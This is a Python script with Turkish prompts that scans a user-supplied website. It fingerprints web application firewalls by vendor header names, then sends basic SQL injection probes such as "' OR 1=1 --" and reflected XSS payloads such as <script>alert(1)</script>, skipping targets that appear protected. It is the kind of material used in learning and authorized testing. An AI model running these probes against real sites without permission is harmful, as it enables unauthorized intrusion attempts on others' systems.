import requests

def detect_waf(url):
    
    waf_headers = [
        "cloudflare", "cf-ray", "cf-cache-status", 
        "x-amz-cf-id", "x-amz-apigw-id",
        "akamai-x-cache", "akamai-cloudlet", "akamai-ghost-ip",
        "x-iinfo", "incap-ses", "visid_incap",
        "x-sucuri-id", "x-sucuri-cache",
        "x-hw", "x-waf-status", "bigip-server",
        "bnsv", "barra-counter", "barracuda-ngfw",
        "sessioncookie", "WAF", "DenyAll",
        "fortiwafsid", "fortiweb",
        "cisco-asa",
        "modsecurity", "x-waf",
        "ec-range", "edgecast",
        "rbzid", "reblaze-proxy",
        "x-citrix-waf", "ns_af",
        "x-served-by", "x-cache", "x-fastly-request-id",
        "sp-waf", "sprequestguid",
        "blazingfast",
        "jsluid",  
        "safedog",
        "nsfocus",
        "powercdn"
    ]
    waf_detected = False
    

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }


    test_payload = "' OR 1=1 --"
    test_url = f"{url}{test_payload}"
    
    try:
        response = requests.get(test_url, headers=headers)
        

        for header in response.headers.values():
            for waf_header in waf_headers:
                if waf_header in header.lower():
                    waf_detected = True
                    print(f"WAF algılandı: {waf_header.capitalize()}")
                    return True
        

        if response.status_code == 403 or "waf" in response.text.lower() or "firewall" in response.text.lower():
            waf_detected = True
            print("Yanıt durumuna veya içeriğine göre WAF algılandı.")
            return True
        
    except requests.RequestException as e:
        print(f"WAF testi sırasında hata: {e}")
    
    if not waf_detected:
        print("WAF tespit edilmedi.")
        return False


def test_sql_injection(url):
    payloads = ["'", "' OR 1=1 --", "' OR 'a'='a"]
    vulnerable = False

    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                vulnerable = True
                print(f"SQL açığı mevcut: {payload}")
                break
        except requests.RequestException as e:
            print(f"SQL testi sırasında hata: {url}: {e}")
    
    if not vulnerable:
        print("SQL güvenlik açığı bulunamadı.")


def test_xss(url):
    payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']
    vulnerable = False

    for payload in payloads:
        params = {'input': payload}
        try:
            response = requests.get(url, params=params)
            if payload in response.text:
                vulnerable = True
                print(f"XSS açığı mevcut: {payload}")
                break
        except requests.RequestException as e:
            print(f"XSS testi sırasında hata: {url}: {e}")
    
    if not vulnerable:
        print("XSS güvenlik açığı bulunamadı.")

def main():
    url = input("Website URL'sini giriniz: ")
    

    print("WAF kontrol ediliyor (Firewall)...")
    if detect_waf(url):
        print("Firewall algılandı, ileri kontroller atlanıyor...")
        return
    
    print("Yöntem seçin:")
    print("1. SQL Injection")
    print("2. XSS")
    choice = input("SQL için 1, XSS için 2'yi tuşlayınız: ")

    if choice == "1":
        print("SQL güvenlik açıkları test ediliyor...")
        test_sql_injection(url)
    elif choice == "2":
        print("XSS güvenlik açıkları test ediliyor...")
        test_xss(url)
    else:
        print("Geçersiz seçim. Lütfen 1 veya 2'yi seçin.")

if __name__ == "__main__":
    main()
